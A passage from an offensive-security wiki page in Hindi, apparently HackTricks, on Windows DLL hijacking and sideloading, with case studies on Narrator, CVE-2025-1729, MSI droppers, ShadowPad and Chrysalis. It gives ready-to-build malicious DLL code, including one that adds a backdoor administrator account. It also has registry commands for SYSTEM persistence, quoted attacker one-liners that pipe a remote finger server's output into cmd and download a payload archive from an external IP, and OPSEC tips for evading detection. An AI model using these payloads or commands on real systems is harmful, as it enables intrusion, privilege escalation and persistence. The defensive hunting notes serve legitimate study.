    }
    return TRUE;
}
```

<details>
<summary>user creation के साथ C++ DLL उदाहरण</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>थ्रेड एंट्री वाला वैकल्पिक C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe शुरू होने पर अब भी एक अनुमानित, language-specific localization DLL को खोजता है, जिसे hijack करके arbitrary code execution और persistence हासिल की जा सकती है।<sup>[[7]](#references)</sup>

मुख्य तथ्य
- Probe path (वर्तमान builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)।
- Legacy path (पुराने builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`।
- यदि OneCore path पर attacker के नियंत्रण वाली writable DLL मौजूद है, तो उसे load किया जाता है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी export की आवश्यकता नहीं है।

Procmon से खोज
- Filter: `Process Name is Narrator.exe` और `Operation is Load Image` या `CreateFile`।
- Narrator शुरू करें और ऊपर दिए गए path को load करने के प्रयास पर ध्यान दें।

न्यूनतम DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC silence
- एक naïve hijack से UI में आवाज़ या highlight दिखेगा। चुपचाप रहने के लिए, attach होने पर Narrator threads को enumerate करें, main thread खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; अपना काम अपने thread में जारी रखें। पूरे code के लिए PoC देखें।<sup>[[8]](#references)</sup>

Accessibility configuration के ज़रिए Trigger और persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए configuration के साथ, Narrator शुरू करने पर planted DLL load होती है। Secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।

RDP के ज़रिए trigger किया गया SYSTEM execution (lateral movement)
- Classic RDP security layer की अनुमति दें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host से RDP करें और logon screen पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।
- RDP session बंद होने पर execution रुक जाता है—जल्दी से inject/migrate करें।

अपना Accessibility Tool (BYOA) लाएँ
- आप किसी built-in Accessibility Tool (AT) की registry entry (जैसे, CursorIndicator) clone कर सकते हैं, उसे edit करके किसी arbitrary binary/DLL की ओर point कर सकते हैं, उसे import कर सकते हैं, और फिर `configuration` को उस AT name पर set कर सकते हैं। इससे Accessibility framework के तहत arbitrary execution proxy होता है।

नोट्स
- `%windir%\System32` में लिखने और HKLM values बदलने के लिए admin rights चाहिए।
- सारा payload logic `DLL_PROCESS_ATTACH` में रखा जा सकता है; किसी export की ज़रूरत नहीं है।

## Case Study: CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation

यह case Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** दिखाता है। इसे **CVE-2025-1729** के रूप में track किया गया है।<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` में स्थित `TPQMAssistant.exe`।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोज़ सुबह 9:30 बजे logged-on user के context में चलता है।
- **Directory Permissions**: `CREATOR OWNER` को write permission है, जिससे local users arbitrary files डाल सकते हैं।
- **DLL Search Behavior**: यह पहले अपनी working directory से `hostfxr.dll` load करने की कोशिश करता है और DLL न मिलने पर "NAME NOT FOUND" log करता है, जो local directory search precedence को दर्शाता है।

### Exploit Implementation

Attacker उसी directory में malicious `hostfxr.dll` stub रख सकता है। इस तरह missing DLL का फ़ायदा उठाकर user के context में code execution हासिल किया जा सकता है:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### हमला प्रवाह

1. एक standard user के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. Scheduled task के वर्तमान user के context में सुबह 9:30 बजे चलने तक प्रतीक्षा करें।
3. यदि task चलने पर कोई administrator लॉग इन है, तो malicious DLL administrator के session में medium integrity पर चलती है।
4. Medium integrity से SYSTEM privileges तक पहुँचने के लिए standard UAC bypass techniques का उपयोग करें।

## केस स्टडी: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) के ज़रिए DLL Side-Loading

Threat actors अक्सर trusted, signed process के तहत payloads चलाने के लिए MSI-based droppers को DLL side-loading के साथ जोड़ते हैं।<sup>[[10]](#references)</sup>

Chain का अवलोकन
- User MSI डाउनलोड करता है। GUI install के दौरान CustomAction चुपचाप चलती है (उदाहरण के लिए, LaunchApplication या VBScript action), और embedded resources से अगला stage फिर से बनाती है।
- Dropper एक legitimate, signed EXE और एक malicious DLL को एक ही directory में लिखता है (उदाहरण: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- Signed EXE शुरू होने पर, Windows DLL search order सबसे पहले working directory से wsc.dll load करता है और signed parent के तहत attacker का code चलाता है (ATT&CK T1574.001)।

MSI analysis (क्या देखना है)
- CustomAction table:
  - ऐसी entries देखें जो executables या VBScript चलाती हों। संदिग्ध pattern का उदाहरण: LaunchApplication का background में embedded file चलाना।
  - Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables का निरीक्षण करें।
- MSI CAB में embedded/split payloads:
  - Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
  - या lessmsi का उपयोग करें: lessmsi x package.msi C:\out
  - ऐसे कई छोटे fragments देखें जिन्हें VBScript CustomAction जोड़कर decrypt करती है। सामान्य flow:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- इन दोनों फ़ाइलों को एक ही फ़ोल्डर में रखें:
  - wsc_proxy.exe: वैध रूप से signed host (Avast)। यह process अपनी directory से नाम के आधार पर wsc.dll लोड करने का प्रयास करता है।
  - wsc.dll: attacker DLL। यदि किसी विशिष्ट exports की आवश्यकता नहीं है, तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाएँ और DllMain में payload चलाते हुए आवश्यक exports को genuine library तक forward करें।
- एक minimal DLL payload बनाएँ:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export requirements के लिए, proxying framework (जैसे DLLirant/Spartacus) का उपयोग करके ऐसी forwarding DLL बनाएं जो आपका payload भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। यदि host absolute paths या safe loading flags (जैसे LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack विफल हो सकता है।
- KnownDLLs, SxS और forwarded exports precedence को प्रभावित कर सकते हैं; host binary और export set चुनते समय इन बातों पर विचार करें।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon, disk पर core payload को encrypted रखते हुए legitimate software में घुलने-मिलने के लिए **three-file triad** का उपयोग करके ShadowPad deploy करता है:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek या NVIDIA जैसे vendors का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। हमलावर executable का नाम बदलकर उसे Windows binary जैसा दिखाते हैं (उदाहरण के लिए `conhost.exe`), लेकिन Authenticode signature वैध रहता है।
2. **Malicious loader DLL** – इसे EXE के साथ, अपेक्षित नाम (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) के तहत रखा जाता है। DLL आमतौर पर ScatterBrain framework से obfuscated MFC binary होती है; इसका एकमात्र काम encrypted blob ढूंढना, उसे decrypt करना और ShadowPad को reflectively map करना है।
3. **Encrypted payload blob** – अक्सर उसी directory में `<name>.tmp` के रूप में रखा जाता है। Decrypted payload को memory-map करने के बाद, loader forensic evidence नष्ट करने के लिए TMP file delete कर देता है।

Tradecraft notes:

* PE header में मूल `OriginalFileName` रखते हुए signed EXE का नाम बदलने से वह vendor signature बरकरार रखते हुए Windows binary होने का दिखावा कर सकता है। इसलिए Ink Dragon की तरह `conhost.exe` जैसी दिखने वाली binaries रखें, जो वास्तव में AMD/NVIDIA utilities हों।
* चूंकि executable trusted रहता है, इसलिए ज्यादातर allowlisting controls में केवल आपकी malicious DLL को उसके साथ रखना होता है। Loader DLL को customize करने पर ध्यान दें; आमतौर पर signed parent को बिना बदलाव के चलाया जा सकता है।
* ShadowPad के decryptor को TMP blob, loader के साथ उसी directory में और writable स्थिति में चाहिए, ताकि mapping के बाद वह file को zero कर सके। Payload load होने तक directory को writable रखें; memory में आने के बाद OPSEC के लिए TMP file को सुरक्षित रूप से delete किया जा सकता है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators, DLL sideloading को LOLBAS के साथ जोड़ते हैं ताकि disk पर एकमात्र custom artifact trusted EXE के साथ रखी गई malicious DLL हो:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` को spawn करता है, Finger server से commands लेता है और उन्हें `cmd` में pipe करता है:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` TCP/79 से टेक्स्ट प्राप्त करता है; `| cmd` server के response को execute करता है, जिससे operators server-side second stage को बदल सकते हैं।

- **अंतर्निहित download/extract:** किसी benign extension वाली archive download करें, उसे unpack करें, और sideload target तथा DLL को किसी random `%LocalAppData%` folder में रखें:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` progress छिपाता है और redirects को follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के ज़रिए शुरू करें, ताकि telemetry में CIM द्वारा बनाया गया process दिखे, जब वह साथ रखी DLL को load करता है:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - उन binaries के साथ काम करता है जो local DLLs को प्राथमिकता देते हैं (जैसे, `intelbq.exe`, `nearby_share.exe`); payload (जैसे, Remcos) trusted नाम के तहत चलता है।

- **Hunting:** जब `forfiles` में `/p`, `/m`, और `/c` एक साथ दिखाई दें, तो alert करें; admin scripts के बाहर यह असामान्य है।


## केस स्टडी: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हाल ही के Lotus Blossom intrusion ने NSIS-packed dropper पहुँचाने के लिए एक trusted update chain का दुरुपयोग किया। इस dropper ने DLL sideload और पूरी तरह in-memory payloads को stage किया।<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** के रूप में चिह्नित करता है, Bitdefender Submission Wizard का renamed `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` वहाँ drop करता है, फिर EXE launch करता है।
- Host EXE `log.dll` import करता है और `LogInit`/`LogWrite` को call करता है। `LogInit` blob को mmap-load करता है; `LogWrite` उसे custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material एक prior hash से derived), buffer को plaintext shellcode से overwrite करता है, अस्थायी data को free करता है, और उस पर jump करता है।
- IAT से बचने के लिए, loader export names को hash करने हेतु **FNV-1a basis 0x811C9DC5 + prime 0x1000193** का उपयोग करता है, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू करके salted target hashes से तुलना करता है।

Main shellcode (Chrysalis)
- पाँच passes में key `gQ2JR&9;` का उपयोग करके add/XOR/sub दोहराते हुए PE-जैसे main module को decrypt करता है, फिर import resolution पूरा करने के लिए `Kernel32.dll` → `GetProcAddress` को dynamically load करता है।
- Per-character bit-rotate/XOR transforms के ज़रिए runtime पर DLL name strings को फिर से बनाता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- दूसरा resolver **PEB → InMemoryOrderModuleList** को traverse करता है, हर export table को 4-byte blocks में Murmur-style mixing के साथ parse करता है, और hash नहीं मिलने पर ही `GetProcAddress` का सहारा लेता है।

Embedded configuration & C2
- Config, drop की गई `BluetoothService` file के भीतर **offset 0x30808** (size **0x980**) पर मौजूद है और key `qwhvb^435h&*7` से RC4-decrypt होती है, जिससे C2 URL और User-Agent सामने आते हैं।
- Beacons dot-delimited host profile बनाते हैं, आगे tag `4Q` जोड़ते हैं, फिर HTTPS पर `HttpSendRequestA` से भेजने से पहले key `vAuig34%^325hGV` के साथ RC4-encrypt करते हैं। Responses RC4-decrypt होते हैं और tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases) के ज़रिए dispatch होते हैं।
- Execution mode CLI args से नियंत्रित होता है: बिना args के = `-i` की ओर इशारा करने वाली persistence (service/Run key) install करना; `-i` self को `-k` के साथ दोबारा launch करता है; `-k` install छोड़कर payload चलाता है।

देखा गया Alternate loader
- इसी intrusion ने Tiny C Compiler drop किया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` चलाया, जिसके साथ `libtcc.dll` भी मौजूद था। Attacker द्वारा दिया गया C source shellcode embed करता था, उसे compile करता था और PE को disk पर लिखे बिना in-memory चलाता था। इसे इस तरह दोहराएँ:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- इस TCC-आधारित compile-and-run चरण ने runtime पर `Wininet.dll` import किया और hardcoded URL से second-stage shellcode प्राप्त किया, जिससे ऐसा flexible loader बना जो compiler run जैसा दिखता है।

## Signed-host sideloading with export proxying + host thread parking

कुछ DLL sideloading chains में **stability engineering** जोड़ी जाती है, ताकि legitimate host बाद के stages को बिना crash हुए ठीक से load करने के लिए पर्याप्त समय तक चलता रहे।<sup>[[11]](#references)</sup>

देखा गया pattern
- किसी trusted EXE को malicious DLL के साथ, `version.dll` जैसे अपेक्षित dependency name के तहत रखें।
- Malicious DLL **हर अपेक्षित export को proxy** करके असली system DLL (उदाहरण के लिए `%SystemRoot%\\System32\\version.dll`) तक पहुंचाता है, ताकि import resolution सफल रहे और host process काम करता रहे।
- Load होने के बाद, malicious DLL **host entry point को patch** करता है, ताकि main thread बाहर निकलने या process को समाप्त करने वाले code paths चलाने के बजाय अनंत `Sleep` loop में चला जाए।
- एक नया thread असली malicious काम करता है: अगले-stage DLL का name या path decrypt करना (RC4/XOR आम हैं), फिर उसे `LoadLibrary` से launch करना।

यह क्यों महत्वपूर्ण है
- सामान्य DLL proxying API compatibility बनाए रखती है, लेकिन यह सुनिश्चित नहीं करती कि बाद के stages के लिए host पर्याप्त समय तक चलता रहेगा।
- Main thread को `Sleep(INFINITE)` में park करना signed process को resident रखने का आसान तरीका है, जबकि loader worker thread में decryption, staging या network bootstrap करता है।
- केवल संदिग्ध `DllMain` की तलाश करने पर यह pattern छूट सकता है, अगर दिलचस्प गतिविधि host entry point patch होने और secondary thread शुरू होने के बाद होती है।

न्यूनतम workflow
1. Signed host EXE कॉपी करें और पता करें कि वह local directory से कौन-सी DLL resolve करता है।
2. समान functions export करने वाली proxy DLL बनाएं और उन्हें legitimate DLL तक forward करें।
3. `DllMain(DLL_PROCESS_ATTACH)` में worker thread बनाएं।
4. उस thread से host entry point या main thread start routine को patch करें, ताकि वह `Sleep` पर loop करे।
5. अगले-stage DLL का name/config decrypt करें और `LoadLibrary` call करें या payload को manual-map करें।

रक्षात्मक जांच के संकेत
- ऐसे signed processes जो `version.dll` या इसी तरह की सामान्य libraries को `System32` के बजाय अपनी application directory से load करते हैं।
- Image load होने के कुछ ही समय बाद process entry point पर memory patches, खास तौर पर वे jumps/calls जो `Sleep`/`SleepEx` पर redirect होते हैं।
- Proxy DLL द्वारा बनाए गए ऐसे threads जो तुरंत decrypted name वाली दूसरी DLL पर `LoadLibrary` call करते हैं।
- Writable staging directories जैसे `ProgramData`, `%TEMP%` या unpacked archive paths में vendor executables के साथ रखी गई full-export proxy DLLs।

## References

- [1] [Red Canary – जनवरी 2026: Intelligence Insights](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows में DLL hijacking: एक सरल C उदाहरण।](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore ने Europe को निशाना बनाते हुए नया malware deploy किया](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: जब DLL Hijacks की मुलाकात Windows Helpers से होती है](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – डिजिटल Doppelgangers: Gh0st RAT वितरित करने वाले बदलते Impersonation Campaigns की पड़ताल](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – मिलते-जुलते हित: दक्षिण-पूर्व एशियाई सरकार को निशाना बनाने वाले Threat Clusters का विश्लेषण](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon के भीतर: Relay Network और Stealthy Offensive Operation की आंतरिक कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom के toolkit की गहन पड़ताल](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – ईरानी APT Screening Serpens के 2026 Espionage Campaigns की निगरानी](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – तेज़ और ज़ोरदार: ईरानी संघर्ष के दौरान Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 ने दक्षिण-पूर्व एशियाई सरकारों और Critical Infrastructure को निशाना बनाया](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
